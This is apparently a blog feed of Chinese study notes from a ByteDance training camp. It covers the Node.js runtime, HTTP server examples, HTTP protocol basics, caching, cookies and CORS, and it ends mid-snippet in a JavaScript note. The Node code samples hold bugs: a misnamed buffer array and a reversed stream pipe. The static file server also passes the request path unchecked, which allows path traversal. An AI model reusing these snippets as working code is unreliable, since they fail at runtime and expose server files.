      <link href="/learningNotes/ByteDance/09%20%E6%AC%A7%E9%98%B3%E4%BA%9A%E4%B8%9C%20Nodejs%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98"/>
      <url>/learningNotes/ByteDance/09%20%E6%AC%A7%E9%98%B3%E4%BA%9A%E4%B8%9C%20Nodejs%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98</url>
      
        <content type="html"><![CDATA[<h2 id="1.-nodejs-的应用场景-why">1. Nodejs 的应用场景 why<a title="#1.-nodejs-的应用场景-why" href="#1.-nodejs-的应用场景-why"></a></h2><h4 id="前端工程化">前端工程化<a title="#前端工程化" href="#前端工程化"></a></h4><ul><li>Bundle：webpack、vite、esbuild、parcel</li><li>Uglify：uglifyjs</li><li>Transpile：bablejs、typescript</li><li>其他语言加入竞争：esbuild、parcel、prisma</li><li>现状：难以替代</li></ul><h4 id="web-服务端应用">web 服务端应用<a title="#web-服务端应用" href="#web-服务端应用"></a></h4><ul><li>学习曲线平缓，开发效率高</li><li>运行效率接近常见的编译语言</li><li>社区生态丰富及工具链成熟 npm、v8 inspector</li><li>与前端结合的场景会有优势 ssr</li><li>现状：竞争激烈，nodejs 有自己独特的优势</li></ul><h4 id="electron-跨端桌面应用">Electron 跨端桌面应用<a title="#electron-跨端桌面应用" href="#electron-跨端桌面应用"></a></h4><ul><li>商业应用：vscode、slack、discord、zoom</li><li>大型公司内的效率工具</li><li>现状：大部分在选型时，都值得考虑</li></ul><h4 id="nodejs-在字节">Nodejs 在字节<a title="#nodejs-在字节" href="#nodejs-在字节"></a></h4><ul><li>BFF、SSR</li><li>服务端应用：头条搜索、西瓜视频</li><li>Electron：飞连、飞书</li></ul><h2 id="2.-nodejs-运行时结构-what">2. Nodejs 运行时结构 what<a title="#2.-nodejs-运行时结构-what" href="#2.-nodejs-运行时结构-what"></a></h2><img src="https://i.bmp.ovh/imgs/2022/01/1a6e5ab8fa56abba.png" style="zoom:67%;" ><blockquote><p>社区npm代码 ：acron、node-inspect 调试、npm本身</p><p>N-API：js性能太低，想用更native的语言</p><p>v8：实现js运行时</p><p>libuv：封装了操作系统api，nodejs最核心的内容</p><p>nghttp2：与 http2 相关的模块</p><p>zlib：做一些场景压缩解压缩的算法</p><p>c-ares：做dns查询的库</p><p>llhttp：做http协议的解析</p><p>openssl：网络层的加密解密协议</p></blockquote><h4 id="v8，libuv">V8，libuv<a title="#v8，libuv" href="#v8，libuv"></a></h4><p>V8：JavaScript Runtime，诊断调试工具 inspector</p><p>libuv：eventloop 事件循环，syscall 系统调用</p><p>举例：用 node-fetch 发起请求时…</p><blockquote><p>nodejs 其实是基于 v8 做的。</p><p>面试 ：libuv是用来干嘛的？</p></blockquote><h4 id="特点">特点<a title="#特点" href="#特点"></a></h4><ul><li><p>异步 I/O</p></li><li><p>单线程 worker_thread可以起独立线程，但每个线程的模型没有太大变化</p><p>JS 单线程：JS 线程 + uv 线程池 + V8 任务线程池 + V8 inspector 线程</p><p>优点：不用考虑多线程状态同步问题，也就不需要锁；同时还能比较较高效地利用系统资源</p><p>缺点：阻塞会产生更多负面影响 – 使用多进程 或者 多线程</p></li><li><p>跨平台</p><p>Nodejs 跨平台 + JS 无需编译环境 ( + web 跨平台 + 诊断工具跨平台 ) – 开发成本低、整体学习成本低</p></li></ul><h2 id="3.-编写-http-server-how">3. 编写 Http Server how<a title="#3.-编写-http-server-how" href="#3.-编写-http-server-how"></a></h2><h3 id="3.0-安装-nodejs">3.0 安装 nodejs<a title="#3.0-安装-nodejs" href="#3.0-安装-nodejs"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// json</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> bufd = [];</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>,<span class="function">(<span class="params">buf</span>) =&gt;</span> &#123;</span><br><span class="line">        bufs.<span class="title function_">push</span>(buf)</span><br><span class="line">    &#125;)</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(bufs).<span class="title function_">toString</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> msg = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> ret = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(buf);</span><br><span class="line">            msg = ret.<span class="property">msg</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> responseJson = &#123;</span><br><span class="line">            <span class="attr">msg</span>:<span class="string">`receive:<span class="subst">$&#123;msg&#125;</span>`</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(responseJson))</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(port, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`server listen on:<span class="subst">$&#123;port&#125;</span>`</span>);  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3.1-编写-http-server-+-client-，收发-get，post">3.1 编写 Http Server + Client ，收发 GET，POST<a title="#3.1-编写-http-server-+-client-，收发-get，post" href="#3.1-编写-http-server-+-client-，收发-get，post"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> body = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&#x27;Hello from my own client&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> req = http.<span class="title function_">request</span>(<span class="string">&#x27;http://127.0.0.1:3000&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> bufs = [];</span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">buf</span> =&gt;</span>&#123;</span><br><span class="line">        bufs.<span class="title function_">push</span>(buf)</span><br><span class="line">    &#125;)</span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(bufs);</span><br><span class="line">        <span class="keyword">const</span> json = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(buf);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;json.msg is:&#x27;</span>, json.<span class="property">msg</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">req.<span class="title function_">end</span>(body)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 promise + async await 重写这两例子</span></span><br><span class="line"><span class="comment">// 技巧：将callback 转换为 promise</span></span><br><span class="line"><span class="comment">// eg：改写 上上个代码</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="keyword">async</span> (req,res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> msg = <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123; <span class="comment">//change</span></span><br><span class="line">        <span class="keyword">const</span> bufd = [];</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>,<span class="function">(<span class="params">buf</span>) =&gt;</span> &#123;</span><br><span class="line">        bufs.<span class="title function_">push</span>(buf)</span><br><span class="line">    &#125;)</span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;  <span class="comment">// change</span></span><br><span class="line">            <span class="title function_">reject</span>(err)             <span class="comment">// change</span></span><br><span class="line">        &#125;)                          <span class="comment">// change</span></span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(bufs).<span class="title function_">toString</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">            <span class="keyword">let</span> msg = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">const</span> ret = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(buf);</span><br><span class="line">                msg = ret.<span class="property">msg</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">resolve</span>(msg);   <span class="comment">// change</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">     <span class="keyword">const</span> responseJson = &#123;</span><br><span class="line">            <span class="attr">msg</span>:<span class="string">`receive:<span class="subst">$&#123;msg&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line">      res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(responseJson))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(port, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`server listen on:<span class="subst">$&#123;port&#125;</span>`</span>);  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3.2-编写静态资源服务器">3.2 编写静态资源服务器<a title="#3.2-编写静态资源服务器" href="#3.2-编写静态资源服务器"></a></h3><p>简单静态文件服务：</p><p>与高性能、可靠的服务相比，还差：CDN 缓存加速、分布式储存、容灾</p><p>外部服务：cloudflare，七牛云，阿里云，华山云</p><blockquote><p>用 stream 风格的 api 有什么好处？</p><p>占用尽可能少的内存空间、内存使用率更好</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> folderPath = path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./static&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// expected http://127.0.0.1:3000/index.html</span></span><br><span class="line">    <span class="keyword">const</span> info = url.<span class="title function_">parse</span>(req.<span class="property">url</span>);</span><br><span class="line">    <span class="comment">// static/index.html</span></span><br><span class="line">    <span class="keyword">const</span> filepath = path.<span class="title function_">resolve</span>(folderPath, <span class="string">&#x27;./&#x27;</span>, info.<span class="property">path</span>);</span><br><span class="line">    <span class="comment">// stream api..</span></span><br><span class="line">    <span class="keyword">const</span> filestream = fs.<span class="title function_">createReadStream</span>(filepath);</span><br><span class="line">    res.<span class="title function_">pipe</span>(filestream)</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(port, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`server listen on:<span class="subst">$&#123;port&#125;</span>`</span>);  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3.3-编写-react-ssr">3.3 编写 React SSR<a title="#3.3-编写-react-ssr" href="#3.3-编写-react-ssr"></a></h3><p>SSR — server side rendering 特点：</p><ul><li>相比传统 HTML 模板引擎：避免重复编写代码</li><li>相比 SPA：首屏渲染更快，seo 友好</li><li>缺点：通常qps 较低，前端代码编写时要考虑服务端渲染情况</li></ul><h3 id="3.4-适用-inspector-进行调试、诊断">3.4 适用 inspector 进行调试、诊断<a title="#3.4-适用-inspector-进行调试、诊断" href="#3.4-适用-inspector-进行调试、诊断"></a></h3><ul><li>v8 inspector：开箱即用，特性丰富强大，与前端开发一致，跨平台<ul><li>启动时 <code>node  --inspect 文件.js </code></li><li>open <a href="http://localhost:9229/json">http://localhost:9229/json</a></li></ul></li><li>场景：<ul><li>查看 console.log 内容</li><li>breakpoint</li><li>高 cpu、死循环：cpuprofile</li><li>高内存占用：heapsnapshot</li><li>性能分析</li></ul></li></ul><h3 id="3.5-部署简介">3.5 部署简介<a title="#3.5-部署简介" href="#3.5-部署简介"></a></h3><p>解决的问题：</p><ul><li>守护进程：当进程退出时，重新拉起</li><li>多进程：cluster 便捷地利用多进程</li><li>记录进程状态，用于诊断</li></ul><p>容器环境：</p><ul><li>通常有健康检查的手段，只需要考虑多核 cpu 利用率即可</li></ul><h2 id="4.-延伸话题">4. 延伸话题<a title="#4.-延伸话题" href="#4.-延伸话题"></a></h2><p>nodejs 贡献代码</p><p>追踪/诊断</p><p>WASM，NAPI</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 青训营 </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP 指南 - 字节青训营</title>
      <link href="/learningNotes/ByteDance/08%20%E6%9D%A8%E8%B6%85%E7%94%B7%20http%E6%8C%87%E5%8D%97"/>
      <url>/learningNotes/ByteDance/08%20%E6%9D%A8%E8%B6%85%E7%94%B7%20http%E6%8C%87%E5%8D%97</url>
      
        <content type="html"><![CDATA[<h2 id="1.-初始：什么是http">1. 初始：什么是HTTP<a title="#1.-初始：什么是http" href="#1.-初始：什么是http"></a></h2><h3 id="什么是http">什么是HTTP<a title="#什么是http" href="#什么是http"></a></h3><ul><li>Hyper Text Transfer Protocol</li><li>应用层协议、基于TCP</li><li>请求、响应</li><li>简单可扩展</li><li>无状态</li></ul><h2 id="2.-协议分析：报文结构">2. 协议分析：报文结构<a title="#2.-协议分析：报文结构" href="#2.-协议分析：报文结构"></a></h2><h3 id="发展">发展<a title="#发展" href="#发展"></a></h3><ul><li><p>HTTP 0.9 — 单行协议</p><p>请求GET/mypage.html、响应只有HTML文档</p></li><li><p>HTTP 1.0 — 构建可扩展性</p><p>增加了Header、有了状态码、支持多种文档、…</p></li><li><p>HTTP 1.1 — 标准化协议</p><p>链接复用、缓存、内容协商、…</p></li><li><p>HTTP 2 — 更加优异的表现</p><p>二进制协议、压缩header、服务器推送、…</p></li><li><p>HTTP 3 — 草案</p></li></ul><h3 id="报文">报文<a title="#报文" href="#报文"></a></h3><h4 id="+-start-line-：method-path-version">+ start line ：Method Path Version<a title="#+-start-line-：method-path-version" href="#+-start-line-：method-path-version"></a></h4><ul><li><h5 id="method：">Method：<a title="#method：" href="#method："></a></h5><p>GET — 请求一个指定资源，只用于获取数据</p><p>POST — 用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用</p><p>PUT — 用于请求有效载荷替换目标资源的所有当前表示</p><p>DELETE — 删除指定资源</p><p>HEAD — 请求与get响应相同的响应头</p><p>CONNECT — 建立一个到目标资源标识的服务器的隧道</p><p>OPTIONS — 用于描述目标资源的通信选项</p><p>TRACE — <strong>沿着到目标资源的路径执行一个消息环回测试</strong></p><p>PATCH — <strong>用于对资源应用部分修改</strong></p><blockquote><p>Safe：不会修改服务器的数据的方法：GET、HEAD、OPTIONS</p><p>Idempotent幂等：同样的请求被执行一次或多次的效果是一样的，服务器的状态也是一样的：GET、HEAD、OPTIONS、PUT、DELETE</p></blockquote></li><li><h5 id="状态码">状态码<a title="#状态码" href="#状态码"></a></h5><p>200、301、302、401 (请求未经授权)、404、500、504(网关或代理服务器处理超时)</p></li><li><h4 id="restful-api">RESTful API<a title="#restful-api" href="#restful-api"></a></h4><p>一种API设计风格，REST — Representational State Transfer</p><ul><li>每一个URI代表一种资源</li><li>客户端和服务器之间，传递这种资源的某种表现层</li><li>客户端通过HTTP method，对服务器资源进行操作，实现“表现层状态转化”</li></ul></li></ul><h4 id="+-http-headers">+ HTTP Headers<a title="#+-http-headers" href="#+-http-headers"></a></h4><h5 id="请求头">请求头<a title="#请求头" href="#请求头"></a></h5><p>Accept：接收类型，表示浏览器支持的MIME类型，对标服务器端返回的Content-type</p><p>Content-Type：客户端发送出去的实体内容的类型</p><p>Cache-Control：指定请求和响应遵循的缓存机制</p><p>If-Modified-Since：对应服务端的<strong>Last-Modified</strong>，用来匹配看文件是否变动，精确1s内</p><p>Expires：缓存控制，在这个时间内直接使用请求</p><p>Max-age：资源再本地缓存多少秒</p><p>If-None-Match：对应服务端<strong>Etag</strong>，匹配文件内容是否改变，较精确</p><p>Cookie：有cookie并且同域访问时会自动带上</p><p>Referer：该页面的来源URL，适用所有类型请求，详细到页面地址，csrf拦截会用到</p><p>Origin：最初请求从哪发起的，只精确到端口号，比上更尊重隐私</p><p>User-Agent：用户客户端的一些必要信息</p><h5 id="响应头">响应头<a title="#响应头" href="#响应头"></a></h5><p>Content-Type：服务端返回的实体内容的类型</p><p>Cache-Control：指定请求和响应遵循的缓存机制</p><p><strong>Last-Modified</strong>：请求资源的最后修改时间</p><p>Expires：在什么时候认为文档已经过期，不再缓存</p><p>Max-age：资源再本地缓存多少秒，开启Cache-Control后有效</p><p><strong>Etag</strong>：资源的特定版本标识符</p><p>Set-Cookie：设置于页面关联的cookie，将其传给客户端</p><p>Server：服务器的一些信息</p><p>Access-Control-Allow-Origin：服务器端允许请求Origin头部</p><h5 id="缓存">缓存<a title="#缓存" href="#缓存"></a></h5><ul><li>强缓存<ul><li>Expires，时间戳</li><li>Cache-Content<ul><li>可缓存性：no-cache 协商缓存验证、no-store 不使用任何缓存</li><li>到期：max-age 存储的最大周期/秒，相对于请求时间</li><li>重新验证/重新加载：must-revalidate：一旦资源过期，在成功向原始服务器验证之前，不能使用</li></ul></li></ul></li><li>协商缓存<ul><li>Etag/If-None-Match：资源特定版本的标识符</li><li>Last-Modified/If-Modified-Since：最后最该时间</li></ul></li></ul><img src = 'https://i.bmp.ovh/imgs/2022/01/b367c028a88374dc.png' style="zoom:67%;" /><h5 id="cookie">cookie<a title="#cookie" href="#cookie"></a></h5><p>Name=value</p><p>Expires=Date：有效期，缺省时表在浏览器关闭前有效</p><p>Path=Path：限制指定cookie的发送范围的文件目录，默认为当前</p><p>Domain=domain：限制cookie生效的域名，默认为创建cookie的服务域名</p><p>secure：仅在HTTPS安全连接时，才可以发送cookie</p><p>HttpOnly：js脚本无法获得</p><p>SameSite=[None|Strict|Lax]：None同站、跨站请求都可以发送、Strict 仅在同站发送、lax允许与顶级导航一起发送，并将与第三方网站发起的GET请求一起发送</p><h4 id="+-empty-line">+ empty line<a title="#+-empty-line" href="#+-empty-line"></a></h4><h4 id="+-body">+ body<a title="#+-body" href="#+-body"></a></h4><h3 id="发展-1">发展<a title="#发展-1" href="#发展-1"></a></h3><h4 id="http2-更快、更稳定、更简单">HTTP2 更快、更稳定、更简单<a title="#http2-更快、更稳定、更简单" href="#http2-更快、更稳定、更简单"></a></h4><p>帧 frame：HTTP/2 通信的最小单位，每个帧都包含帧头，至少会标识出当前帧所属的数据流</p><ul><li>二进制</li></ul><p>消息：与逻辑请求或响应消息对应的完整的一系列帧</p><p>数据流：已建立的连接内的双向字节流，可以承载一条或多条消息</p><ul><li><p>交错发送，接收方重组织</p></li><li><p>HTTP/2 连接都是永久的，而且仅需要每个来源一个连接</p></li><li><p>流控制：组织发送方 向 接收方 发送大量数据的机制</p></li><li><p>服务器推送</p></li></ul><h4 id="https-概述">HTTPS 概述<a title="#https-概述" href="#https-概述"></a></h4><ul><li><p>HTTPS：Hypertext Transfer Protocol Secure</p></li><li><p>经过 TSL/SSL加密</p></li><li><p>对称加密：加解密都是使用同一个密钥</p></li><li><p>非对称加密：需要是哦那个两个不同的密钥，公钥 public key、私钥 private key</p></li></ul><h2 id="3.-常见场景：静态资源、登陆">3. 常见场景：静态资源、登陆<a title="#3.-常见场景：静态资源、登陆" href="#3.-常见场景：静态资源、登陆"></a></h2><h4 id="静态资源-—-今日头条-index.css">静态资源 — 今日头条 index.css<a title="#静态资源-—-今日头条-index.css" href="#静态资源-—-今日头条-index.css"></a></h4><p>状态码200就一定是发起请求了吗？</p><p>从Response中观察 缓存策略、资源类型、允许访问的域名</p><p>静态资源方案：缓存+CDN+文件打包时产生的hash</p><h4 id="登录">登录<a title="#登录" href="#登录"></a></h4><p>为什么有options的请求？ – cross-origin</p><p>cors：复杂请求会进行预请求，获知服务器端是否允许该跨源请求</p><blockquote><p>相关协议头：</p><p>Access-Control-Allow-Origin、</p><p>Access-Control-Expose-Headers</p><p>Access-Control-Max-Age</p><p>Access-Control-Allow-Credentials</p><p>Access-Control-Allow-Methods</p><p>Access-Control-Allow-Headers</p><p>Access-Control-Request-Method</p><p>Access-Control-Request-Method</p><p>Access-Control-Request-Headers</p><p>Origin</p></blockquote><p>跨域的解决方案：cors、代理服务器、iframe、jsonp…</p><p>从Response 和 Request 观察 向什么地址做了什么动作、携带了/返回了什么信息</p><p>下一次进入页面为什么能记住登陆态？ — 鉴权 session+cookie 、JWT json web token</p><p>进入同个网站的其他站点为什么也有登录态？— SSO 单点登录</p><h2 id="4.-实际应用：浏览器与node中使用">4. 实际应用：浏览器与node中使用<a title="#4.-实际应用：浏览器与node中使用" href="#4.-实际应用：浏览器与node中使用"></a></h2><h3 id="浏览器">浏览器<a title="#浏览器" href="#浏览器"></a></h3><h4 id="+-ajax-之-xhr">+ AJAX 之 XHR<a title="#+-ajax-之-xhr" href="#+-ajax-之-xhr"></a></h4><ul><li>XHR：XMLHttpRequest</li><li>readyState：<ul><li>0 UNSENT 代理被创建</li><li>1 OPENED open() 已被调用</li><li>2 Header-received send() 已经被调用，获得头部和状态</li><li>3 loading 下载中，responseText 属性已有部分数据</li><li>4 done 下载已完成</li></ul></li></ul><h4 id="+-ajax-之-fetch">+ AJAX 之 Fetch<a title="#+-ajax-之-fetch" href="#+-ajax-之-fetch"></a></h4><ul><li>XHLHttpRequest 的升级版</li><li>使用 Promise</li><li>模块化设计，Response，Request、Header 对象</li><li>通过数据流处理对象，支持分块读取</li></ul><h3 id="node">node<a title="#node" href="#node"></a></h3><p>标准库：HTTP/HTTPS</p><h3 id="实战">实战<a title="#实战" href="#实战"></a></h3><p>请求库：axios</p><p>用户体验：</p><ul><li>网络优化：http2、cdn动态加速、dns预解析、网络预连接、域名收敛/发散、压缩、https性能优化</li><li>稳定性：重试机制(超时、有误)、缓存、数据安全(Https、劫持)</li></ul><h2 id="5.了解更多：不止http协议一个选择">5.了解更多：不止HTTP协议一个选择<a title="#5.了解更多：不止http协议一个选择" href="#5.了解更多：不止http协议一个选择"></a></h2><h3 id="websocket">WebSocket<a title="#websocket" href="#websocket"></a></h3><ul><li>浏览器与服务器进行全双工通讯的网络技术</li><li>URL使用ws:// 或 wss:// 等开头</li><li>场景：实时性要求高、聊天室</li></ul><h3 id="quic">QUIC<a title="#quic" href="#quic"></a></h3><p>基于http3，udp，目前还是草案状态</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 青训营 </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>月影讲js - 字节青训营</title>
      <link href="/learningNotes/ByteDance/03%20%E6%9C%88%E5%BD%B1%E8%AE%B2js"/>
      <url>/learningNotes/ByteDance/03%20%E6%9C%88%E5%BD%B1%E8%AE%B2js</url>
      
        <content type="html"><![CDATA[<ol><li>通过 html css 触发事件</li></ol>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;modeCheckBox&quot;</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;modeBtn&quot;</span> <span class="attr">for</span>=<span class="string">&quot;modeCheckBox&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">// 点击 label 就会选择 input[type=&quot;checkbox&quot;]</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span 